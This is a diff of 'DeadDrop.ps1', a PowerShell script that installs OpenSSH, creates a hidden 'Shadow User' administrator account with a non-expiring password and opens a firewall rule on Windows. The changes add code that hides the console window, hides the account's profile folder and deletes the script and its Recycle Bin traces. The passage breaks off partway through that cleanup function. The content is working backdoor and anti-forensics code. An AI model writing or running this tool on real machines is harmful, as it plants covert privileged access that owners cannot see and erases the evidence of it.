@@ -1,6 +1,6 @@
 # DeadDrop.ps1
 # PowerShell script for deploying SSH and hidden admin user on Windows
-# Author: YourNameHere
+# Author: ghxst_fps
 
 # Function to print red ASCII banner
 function Print-Banner {
@@ -19,12 +19,26 @@ function Print-Banner {
 "@
     Write-Host $ascii -ForegroundColor Red
 }
+
 function Check-Admin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
         Write-Error "Script must be run as Administrator."
         exit 1
     }
+}
+
+function Minimize-Window {
+    $vbsPath = "$env:TEMP\minimize.vbs"
+    Set-Content -Path $vbsPath -Value 'Set WshShell = CreateObject("WScript.Shell") : WshShell.SendKeys "% n"'
+    Start-Process -WindowStyle Hidden -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
+    Start-Sleep -Milliseconds 500
+    Remove-Item $vbsPath -Force
+}
+
+$minimize = Read-Host "[?] Minimize this PowerShell window? (Y/N)"
+if ($minimize -match '^[Yy]') {
+    Minimize-Window
 }
 
 function Install-OpenSSH {
@@ -84,7 +98,7 @@ function Create-ShadowUser {
         try {
             Write-Host "[*] Creating user '$username'..."
             $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-            New-LocalUser -Name $username -Password $securePass -FullName "Shadow User" -Description "User" -PasswordNeverExpires -AccountNeverExpires
+            New-LocalUser -Name $username -Password $securePass -FullName "Shadow User" -Description "Hidden admin user" -PasswordNeverExpires -AccountNeverExpires
             Write-Host "[+] User '$username' created."
 
             # Add user to Administrators group
@@ -103,6 +117,14 @@ function Create-ShadowUser {
             Write-Error "[!] Failed to create or hide user '$username': $_"
             exit 1
         }
+    }
+
+    # ✅ Always hide Shadow's user directory
+    $shadowProfile = "$env:SystemDrive\Users\$username"
+    if (Test-Path $shadowProfile) {
+        Write-Host "[*] Hiding '$shadowProfile'..."
+        attrib +h +s $shadowProfile -ErrorAction SilentlyContinue
+        Write-Host "[+] Shadow user directory hidden."
     }
 }
 
@@ -125,16 +147,19 @@ function Add-FirewallRule {
     }
 }
 
-# Main Execution
+function Self-Cleanup {
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $cleanerPath = "$env:TEMP\cleaner.ps1"
 
-Print-Banner
+    # Cleaner script content
+    $cleaner = @"
+Start-Sleep -Seconds 2
+# Delete original script
+Remove-Item -Path `"$scriptPath`" -Force -ErrorAction SilentlyContinue
 
-Check-Admin
-
-Install-OpenSSH
-
-Create-ShadowUser
-
-Add-FirewallRule
-
-Write-Host "`n[+] Setup complete." -ForegroundColor Green
+# Clear DeadDrop scripts from Recycle Bin (shell:RecycleBinFolder = 0xA)
+\$shell = New-Object -ComObject Shell.Application
+\$recycleBin = \$shell.NameSpace(0xA)
+foreach (\$item in \$recycleBin.Items()) {
+    if (\$item.Name -like "*DeadDrop*") {
+        \$item.InvokeVerb("delete")
